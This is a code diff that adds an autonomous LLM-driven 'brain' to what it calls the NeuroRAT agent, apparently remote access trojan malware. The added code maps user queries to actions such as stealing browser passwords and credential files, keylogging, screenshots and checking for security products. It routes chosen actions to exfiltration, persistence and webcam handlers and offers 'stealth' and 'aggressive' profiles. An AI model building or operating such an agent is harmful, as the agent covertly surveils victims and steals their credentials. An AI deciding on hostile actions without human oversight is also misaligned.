@@ -16,6 +16,19 @@ import tempfile
 import re
 from typing import Dict, Any, List, Optional, Union, Callable, Tuple
 
+# Add parent directory to import path
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+# Try to import our autonomous brain
+try:
+    from autonomous_brain import AutonomousBrain
+    HAS_AUTONOMOUS_BRAIN = True
+    logger = logging.getLogger("llm_processor")
+    logger.info("Autonomous Brain module available - enhanced decision-making enabled")
+except ImportError:
+    HAS_AUTONOMOUS_BRAIN = False
+    # Continue with original code
+
 # Configure logging
 logging.basicConfig(
     level=logging.INFO,
@@ -32,16 +45,19 @@ class LLMProcessor:
     LLM processor for autonomous operation of the NeuroRAT agent.
     """
     
-    def __init__(self, use_local_model: bool = True, api_key: Optional[str] = None):
+    def __init__(self, use_local_model: bool = True, api_key: Optional[str] = None, 
+                 system_profile: str = "balanced"):
         """
         Initialize the LLM processor.
         
         Args:
             use_local_model: Whether to use a local model (if available)
             api_key: API key for remote model service (if local model not used)
+            system_profile: Operating profile ("stealth", "balanced", "aggressive")
         """
         self.use_local_model = use_local_model
         self.api_key = api_key
+        self.system_profile = system_profile
         
         # Execution history
         self.execution_history = []
@@ -64,6 +80,19 @@ class LLMProcessor:
         self.local_model_available = self._check_local_model()
         if use_local_model and not self.local_model_available:
             logger.warning("Local LLM model requested but not available, will use fallback parsing")
+            
+        # Initialize autonomous brain if available
+        self.brain = None
+        if HAS_AUTONOMOUS_BRAIN and use_local_model:
+            try:
+                self.brain = AutonomousBrain(
+                    system_profile=system_profile,
+                    max_memory_mb=512,  # Default to 512MB
+                    verbose=False
+                )
+                logger.info("Autonomous Brain initialized successfully")
+            except Exception as e:
+                logger.error(f"Failed to initialize Autonomous Brain: {str(e)}")
     
     def _check_local_model(self) -> bool:
         """Check if a local LLM model is available."""
@@ -73,6 +102,10 @@ class LLMProcessor:
             has_transformers = importlib.util.find_spec("transformers") is not None
             has_torch = importlib.util.find_spec("torch") is not None
             
+            # If we have the autonomous brain, that's even better
+            if HAS_AUTONOMOUS_BRAIN:
+                return True
+                
             return has_transformers and has_torch
         except:
             return False
@@ -132,7 +165,60 @@ class LLMProcessor:
     
     def _process_with_local_model(self, query: str, context: Dict[str, Any], 
                                  is_autonomous: bool) -> Dict[str, Any]:
-        """Process a query using a local LLM model."""
+        """Process a query using a local LLM model or autonomous brain."""
+        # First try using the autonomous brain if available
+        if self.brain is not None:
+            try:
+                # Convert the query into a decision-making task
+                situation = query
+                # Extract possible actions based on the query
+                available_actions = self._extract_actions_from_query(query, context)
+                
+                if available_actions:
+                    # Get system info from context
+                    system_info = {
+                        "os": context.get("system_info", {}).get("os", platform.system()),
+                        "hostname": context.get("system_info", {}).get("hostname", platform.node()),
+                        "username": context.get("system_info", {}).get("username", 
+                                   os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME'))
+                    }
+                    
+                    # Determine urgency based on query language
+                    urgency_keywords = ["urgent", "immediately", "critical", "now", "emergency", "quick"]
+                    urgency = sum(2 if kw in query.lower() else 0 for kw in urgency_keywords) / (2 * len(urgency_keywords))
+                    urgency = max(0.3, min(0.9, urgency))  # Keep within reasonable bounds
+                    
+                    # Let the brain decide
+                    decision = self.brain.decide_action(
+                        situation=situation,
+                        options=available_actions,
+                        system_info=system_info,
+                        urgency=urgency
+                    )
+                    
+                    # Process the chosen action
+                    chosen_action = decision["action"]
+                    action_index = available_actions.index(chosen_action)
+                    action_type = self._get_action_type(chosen_action)
+                    
+                    # Execute the chosen action if we're in autonomous mode
+                    result = None
+                    if is_autonomous and action_type in self.command_handlers:
+                        result = self.command_handlers[action_type](chosen_action)
+                    
+                    return {
+                        "output": f"Decision: {chosen_action}",
+                        "reasoning": decision["reasoning"],
+                        "next_steps": decision.get("next_steps", ""),
+                        "actions": [chosen_action],
+                        "action_results": result,
+                        "confidence": decision.get("confidence", 0.7),
+                        "engine": "autonomous_brain"
+                    }
+            except Exception as e:
+                logger.error(f"Error using autonomous brain: {str(e)}")
+                # Fall through to the original implementation
+        
         try:
             from transformers import AutoModelForCausalLM, AutoTokenizer
             import torch
@@ -194,6 +280,111 @@ class LLMProcessor:
             logger.error(f"Error using local model: {str(e)}")
             # Fall back to rule-based processing
             return self._process_with_rules(query, context, is_autonomous)
+    
+    def _extract_actions_from_query(self, query: str, context: Dict[str, Any]) -> List[str]:
+        """Extract possible actions from a user query."""
+        # Default actions for any query
+        default_actions = [
+            "Do nothing and continue monitoring",
+            "Request more information from the user"
+        ]
+        
+        # Try to generate specific actions based on query keywords
+        specific_actions = []
+        
+        # Information gathering
+        if any(kw in query.lower() for kw in ["find", "search", "locate", "get", "collect", "gather"]):
+            if "password" in query.lower() or "credentials" in query.lower():
+                specific_actions.extend([
+                    "Search for stored passwords in browsers",
+                    "Look for credential files in common locations",
+                    "Extract password-related environment variables"
+                ])
+            if "file" in query.lower():
+                specific_actions.extend([
+                    "Search for files matching specific patterns",
+                    "Find recently modified files",
+                    "Look for files with specific extensions"
+                ])
+            if any(kw in query.lower() for kw in ["system", "info", "hardware", "os"]):
+                specific_actions.extend([
+                    "Collect detailed system information",
+                    "Enumerate installed software",
+                    "Check for security products installed"
+                ])
+                
+        # Monitoring actions
+        if any(kw in query.lower() for kw in ["monitor", "watch", "observe", "track"]):
+            if "network" in query.lower():
+                specific_actions.extend([
+                    "Monitor network connections",
+                    "Capture network traffic summary",
+                    "Track active connections"
+                ])
+            if any(kw in query.lower() for kw in ["key", "keystroke", "typing"]):
+                specific_actions.extend([
+                    "Start keylogger for a short duration",
+                    "Set up continuous keylogging",
+                    "Monitor keyboard activity in specific applications"
+                ])
+            if any(kw in query.lower() for kw in ["screen", "display"]):
+                specific_actions.extend([
+                    "Take a screenshot now",
+                    "Set up periodic screenshots",
+                    "Record screen activity when specific applications are active"
+                ])
+                
+        # Command execution
+        if any(kw in query.lower() for kw in ["run", "execute", "launch", "start"]):
+            specific_actions.extend([
+                "Execute a shell command with the specified parameters",
+                "Run a command with minimal privileges",
+                "Execute command in a separate process"
+            ])
+        
+        # If we have specific actions, combine them with some defaults
+        if specific_actions:
+            # Combine specific actions with a couple of defaults
+            actions = specific_actions + default_actions
+            # Limit to a reasonable number
+            return actions[:5] if len(actions) > 5 else actions
+        
+        # If we couldn't determine specific actions, return some generic ones based on command handlers
+        return [
+            "Collect system information",
+            "Start keylogger monitoring",
+            "Take a screenshot",
+            "Search for valuable files",
+            "Do nothing and continue monitoring"
+        ]
+    
+    def _get_action_type(self, action: str) -> str:
+        """Determine the command type for a given action."""
+        action_lower = action.lower()
+        
+        # Map actions to command types
+        if any(kw in action_lower for kw in ["collect", "gather", "find", "search", "locate"]):
+            return "collect"
+        elif any(kw in action_lower for kw in ["execute", "run", "launch", "start", "command"]):
+            return "execute"
+        elif any(kw in action_lower for kw in ["analyze", "examine", "check"]):
+            return "analyze"
+        elif any(kw in action_lower for kw in ["exfiltrate", "send", "upload", "transmit"]):
+            return "exfiltrate"
+        elif any(kw in action_lower for kw in ["persist", "maintain", "install"]):
+            return "persist"
+        elif any(kw in action_lower for kw in ["keylog", "keystroke", "typing"]):
+            return "keylog"
+        elif any(kw in action_lower for kw in ["screenshot", "screen", "display"]):
+            return "screenshot"
+        elif any(kw in action_lower for kw in ["webcam", "camera"]):
+            return "webcam"
+        elif any(kw in action_lower for kw in ["network", "connection", "traffic"]):
+            return "network"
+        elif any(kw in action_lower for kw in ["scan", "probe", "discover"]):
+            return "scan"
+        else:
+            return "unknown"
     
     def _process_with_rules(self, query: str, context: Dict[str, Any], 
                            is_autonomous: bool) -> Dict[str, Any]:
